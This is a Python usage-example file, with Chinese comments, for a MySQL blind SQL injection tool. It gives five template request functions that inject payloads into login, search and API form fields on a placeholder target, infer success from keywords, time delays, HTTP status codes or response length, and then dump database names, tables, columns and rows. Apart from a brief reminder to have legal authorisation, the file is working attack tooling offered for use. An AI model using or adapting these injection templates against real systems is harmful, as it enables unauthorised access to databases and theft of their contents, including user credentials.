#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MySQL SQL注入测试工具使用示例

本示例展示如何自定义req函数来适应不同的盲注场景
"""

from mysql_sql_inject import get_dbs, get_tables, get_columns, get_datas

# ==================== 示例1: 基于关键词的盲注 ====================

def example_keyword_based():
    """示例：基于关键词的盲注"""
    print("=== 示例1: 基于关键词的盲注 ===")
    
    # 这个示例假设目标系统在注入成功时返回"登录成功"
    # 在注入失败时返回"登录失败"
    
    # 用户需要修改mysql_sql_inject.py中的req函数：
    """
    def req(payload):
        url = "http://your-target.com/login.php"
        data = "username=admin&password=admin' or "+str(payload)+" #"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        r = requests.post(url=url, headers=headers, data=data)
        content = r.content.decode('utf-8')
        
        if "登录成功" in content:
            return 1  # 注入成功
        else:
            return 2  # 注入失败
    """
    
    print("请修改req函数后运行以下代码：")
    print("# databases = get_dbs()")
    print("# print('发现数据库:', databases)")

# ==================== 示例2: 基于时间的盲注 ====================

def example_time_based():
    """示例：基于时间的盲注"""
    print("\n=== 示例2: 基于时间的盲注 ===")
    
    # 这个示例假设目标系统在注入成功时会有延迟
    # 用户需要修改mysql_sql_inject.py中的req函数：
    """
    def req(payload):
        import time
        
        url = "http://your-target.com/search.php"
        data = "q=test' and "+str(payload)+" #"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        start_time = time.time()
        r = requests.post(url=url, headers=headers, data=data)
        end_time = time.time()
        
        response_time = end_time - start_time
        
        if response_time > 2.0:  # 延迟超过2秒认为注入成功
            return 1
        else:
            return 2
    """
    
    print("请修改req函数后运行以下代码：")
    print("# tables = get_tables('testdb')")
    print("# print('发现表:', tables)")

# ==================== 示例3: 基于HTTP状态码的盲注 ====================

def example_status_code_based():
    """示例：基于HTTP状态码的盲注"""
    print("\n=== 示例3: 基于HTTP状态码的盲注 ===")
    
    # 这个示例假设目标系统在注入成功时返回200状态码
    # 在注入失败时返回500状态码
    
    # 用户需要修改mysql_sql_inject.py中的req函数：
    """
    def req(payload):
        url = "http://your-target.com/api.php"
        data = "id=1' and "+str(payload)+" #"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        r = requests.post(url=url, headers=headers, data=data)
        
        if r.status_code == 200:
            return 1  # 注入成功
        else:
            return 2  # 注入失败
    """
    
    print("请修改req函数后运行以下代码：")
    print("# columns = get_columns('testdb', 'users')")
    print("# print('发现列:', columns)")

# ==================== 示例4: 基于响应长度的盲注 ====================

def example_length_based():
    """示例：基于响应长度的盲注"""
    print("\n=== 示例4: 基于响应长度的盲注 ===")
    
    # 这个示例假设目标系统在注入成功时返回较长的响应
    # 在注入失败时返回较短的响应
    
    # 用户需要修改mysql_sql_inject.py中的req函数：
    """
    def req(payload):
        url = "http://your-target.com/search.php"
        data = "keyword=test' and "+str(payload)+" #"
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        
        r = requests.post(url=url, headers=headers, data=data)
        
        if len(r.content) > 1000:  # 响应长度超过1000字节认为注入成功
            return 1
        else:
            return 2
    """
    
    print("请修改req函数后运行以下代码：")
    print("# data = get_datas('testdb', 'users', 'username')")
    print("# print('获取数据:', data)")

# ==================== 示例5: 复杂的自定义逻辑 ====================

def example_complex_logic():
    """示例：复杂的自定义判断逻辑"""
    print("\n=== 示例5: 复杂的自定义判断逻辑 ===")
    
    # 这个示例展示如何组合多种判断策略
    
    # 用户需要修改mysql_sql_inject.py中的req函数：
    """
    def req(payload):
        import time
        
        url = "http://your-target.com/complex.php"
        data = "param=value' and "+str(payload)+" #"
        headers = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        }
        
        start_time = time.time()
        r = requests.post(url=url, headers=headers, data=data)
        end_time = time.time()
        
        response_time = end_time - start_time
        content = r.content.decode('utf-8', errors='ignore')
        
        # 多重判断逻辑
        if response_time > 3.0:
            # 时间盲注判断
            return 1
        elif "success" in content.lower():
            # 关键词判断
            return 1
        elif r.status_code == 200 and len(content) > 500:
            # 状态码+长度组合判断
            return 1
        elif "error" in content.lower():
            # 失败关键词判断
            return 2
        else:
            return 2
    """
    
    print("请修改req函数后运行以下代码：")
    print("# 运行完整扫描")
    print("# databases = get_dbs()")
    print("# for db in databases:")
    print("#     tables = get_tables(db)")
    print("#     print(f'数据库 {db}: {tables}')")

# ==================== 主函数 ====================

def main():
    """主函数"""
    print("MySQL SQL注入测试工具 - 使用示例")
    print("=" * 60)
    print("重要提示：")
    print("1. 这些示例展示了如何自定义req函数")
    print("2. 您需要根据实际目标环境修改req函数")
    print("3. 确保有合法的测试权限")
    print("=" * 60)
    
    # 运行示例
    example_keyword_based()
    example_time_based()
    example_status_code_based()
    example_length_based()
    example_complex_logic()
    
    print("\n" + "=" * 60)
    print("使用步骤：")
    print("1. 根据您的目标环境，选择合适的示例")
    print("2. 修改mysql_sql_inject.py中的req函数")
    print("3. 测试req函数是否正确")
    print("4. 运行相应的功能函数")
    print("=" * 60)

if __name__ == "__main__":
    main() 